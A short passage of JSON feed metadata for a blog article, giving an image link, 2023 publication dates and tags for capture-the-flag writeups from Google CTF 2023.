2023","image":"https://github.com/hash3liZer/khatta.sh/assets/29171692/f553635d-6deb-43e5-a2ae-0d8cef296db7","date_published":"2023-06-27T00:00:00.000Z","date_modified":"2023-07-22T02:07:08.791Z","tags":["ctf","writeups","google-ctf-2023"],"_indieweb":{"type":"article"}}]}